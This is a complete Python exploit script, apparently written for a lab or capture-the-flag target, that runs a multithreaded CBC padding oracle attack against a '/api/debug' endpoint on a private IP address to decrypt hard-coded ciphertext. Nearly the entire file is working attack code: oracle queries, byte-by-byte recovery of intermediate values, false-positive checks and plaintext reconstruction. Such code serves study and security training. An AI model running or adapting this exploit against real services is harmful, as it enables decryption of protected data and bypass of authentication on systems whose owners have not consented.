#!/usr/bin/env python3
"""
Padding oracle attack against Decryptify /api/debug endpoint.

Oracle contract:
  GET http://10.128.180.187:8080/api/debug/<hex(iv||ct)>
    -> body contains "Custom authentication success"  =>  padding is VALID
    -> body contains "Decryption error"               =>  padding is INVALID
"""

import sys
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://10.128.180.187:8080/api/debug/"
BLOCK_SZ = 16
THREADS  = 16   # parallel oracle queries

IV = b"956a591992734c68"

CT_HEX = (
    "EA0DCC6E567F96414433DDF5DC29CDD5"
    "E418961C0504891F0DED96BA57BE8FCF"
    "F2642D7637186446142B2C95BCDEDCCB"
    "6D8D29BE4427F26D6C1B48471F810EF4"
)
CT = bytes.fromhex(CT_HEX)

GOOD = b"custom authentication success"
BAD  = b"decryption error"


def log(msg: str) -> None:
    print(msg, flush=True)


def oracle(prev_block: bytes, target_block: bytes) -> bool:
    """Send garbage_IV + garbage + garbage + prev + target (4 CT blocks total)."""
    garbage = bytes(BLOCK_SZ)
    payload = (garbage + garbage + garbage + prev_block + target_block).hex()
    r = requests.get(BASE_URL + payload, timeout=10)
    body = r.content.lower()
    if GOOD in body:
        return True
    if BAD in body:
        return False
    raise RuntimeError(f"Unexpected response {r.status_code}: {r.content[:100]!r}")


def try_guess(guess: int, pos: int, suffix: bytes, target_block: bytes):
    """Try one guess value; return (guess, result)."""
    prev = bytearray(BLOCK_SZ)
    prev[pos] = guess
    prev[pos + 1:] = suffix
    return guess, oracle(bytes(prev), target_block)


def recover_intermediate(target_block: bytes) -> bytes:
    intermediate = bytearray(BLOCK_SZ)

    for pad_len in range(1, BLOCK_SZ + 1):
        pos = BLOCK_SZ - pad_len

        suffix = bytearray(pad_len - 1)
        for i in range(pad_len - 1):
            suffix[i] = intermediate[pos + 1 + i] ^ pad_len

        found = None
        with ThreadPoolExecutor(max_workers=THREADS) as pool:
            futures = {
                pool.submit(try_guess, g, pos, bytes(suffix), target_block): g
                for g in range(256)
            }
            for future in as_completed(futures):
                guess, valid = future.result()
                if not valid:
                    continue

                # False-positive guard for pad_len==1
                if pad_len == 1:
                    probe = bytearray(BLOCK_SZ)
                    probe[pos] = guess
                    probe[pos + 1:] = suffix
                    probe[BLOCK_SZ - 2] ^= 0x01
                    if not oracle(bytes(probe), target_block):
                        continue

                intermediate[pos] = guess ^ pad_len
                found = guess
                log(f"  pos {pos:2d}: I={intermediate[pos]:02x}  (guess={guess:02x})")
                break

        if found is None:
            raise RuntimeError(f"No valid byte found at pos={pos}, pad_len={pad_len}")

    return bytes(intermediate)


def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def sanity_check() -> None:
    log("[*] Sanity check: valid payload...")
    prev = bytes.fromhex("F2642D7637186446142B2C95BCDEDCCB")
    tgt  = bytes.fromhex("6D8D29BE4427F26D6C1B48471F810EF4")
    assert oracle(prev, tgt), "FAIL: valid payload returned False — check markers"
    log("    OK: oracle returns True for original last two blocks")

    log("[*] Sanity check: corrupted payload...")
    tgt_bad = bytes.fromhex("6D8D29BE4427F26D6C1B48471F810EF5")
    assert not oracle(prev, tgt_bad), "FAIL: corrupted payload returned True"
    log("    OK: oracle returns False for corrupted payload\n")


def main() -> int:
    sanity_check()

    blocks   = [CT[i:i + BLOCK_SZ] for i in range(0, len(CT), BLOCK_SZ)]
    previous = [IV] + blocks[:-1]
    plaintext = b""

    for idx, (prev, target) in enumerate(zip(previous, blocks), start=1):
        log(f"\n[*] Recovering block {idx}/{len(blocks)} ...")
        I = recover_intermediate(target)
        P = xor_bytes(I, prev)
        log(f"    block {idx} plaintext: {P!r}")
        plaintext += P

    log("\n[+] Done.")
    log(f"    Raw bytes   : {plaintext!r}")
    pad = plaintext[-1]
    if 1 <= pad <= BLOCK_SZ and plaintext.endswith(bytes([pad]) * pad):
        plaintext = plaintext[:-pad]
        log(f"    Unpadded    : {plaintext!r}")
    try:
        log(f"    UTF-8       : {plaintext.decode('utf-8')}")
    except UnicodeDecodeError:
        log("    (not valid utf-8)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
